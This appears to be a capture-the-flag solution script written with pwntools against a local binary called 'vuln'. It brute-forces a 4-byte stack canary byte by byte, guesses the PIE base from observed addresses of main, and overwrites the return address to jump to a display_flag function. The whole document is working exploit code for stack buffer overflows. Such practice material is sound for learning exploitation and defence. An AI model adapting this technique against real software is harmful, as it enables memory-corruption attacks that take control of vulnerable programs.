#!/bin/python3

from pwn import *

# context.log_level = 'debug'
context.log_level = 'error'


canaryOffset = 0x58 - 0x38 # from gdb
retOffset = 0x6c - 0x5c


def leakCanary():

	payload = b"A"*canaryOffset

	canary = b""

	payloadLen = canaryOffset

	for _ in range(4): # because there are 4 bytes
		payloadLen +=1
		for c in range(2**8):
			p = process('./vuln')
			p.recvuntil(b"> ")
			p.sendline(str.encode(str(payloadLen)))
			p.recvuntil(b"> ")
			p.send(payload + canary + str.encode(chr(c)))
			response = p.recv()
			p.close()
			if b"Smashing" not in response:
				canary += str.encode(chr(c))
				print(canary.decode() + "*"*(4-len(canary)))
				break
	return canary

def exploit(canary):
	e = ELF('./vuln')
	# r = ROP('./vuln')

	flagOut = b""
	'''
	try until it works (until pie is correct)
	If you try running it over and over again,
	you can see that the addresses of main look
	very similar:

	0x5656f47f
	0x565c047f
	0x565c447f
	0x5658847f

	Thus, we only have to loop through a few
	potential values
	'''
	for i in range(0xff + 1):
		p = process('./vuln')

		payload = b"A"*canaryOffset
		payload += canary
		payload += b"B"*retOffset
		main_addr = int(f'0x565{hex(i)[2:].zfill(2)}47f', 16)
		pieBaseAddress = main_addr - e.sym['main']
		payload += p32(pieBaseAddress + e.sym['display_flag'])
		# payload += p32(0x56556269)
		p.recvuntil(b"> ")
		p.sendline(str.encode(str(len(payload))))

		p.recvuntil(b"> ")
		p.send(payload)

		p.recvuntil(b"Flag?\n")

		try:
			flagOut = p.recv()
			break
		except:
			print(f'Try {i}: Failed')

		p.close()
	return flagOut.rstrip().decode('UTF-8')


canary = leakCanary()
# canary = b'LjgH'
print(f'Found the canary: {canary}')
flag = exploit(canary)  
print(flag)


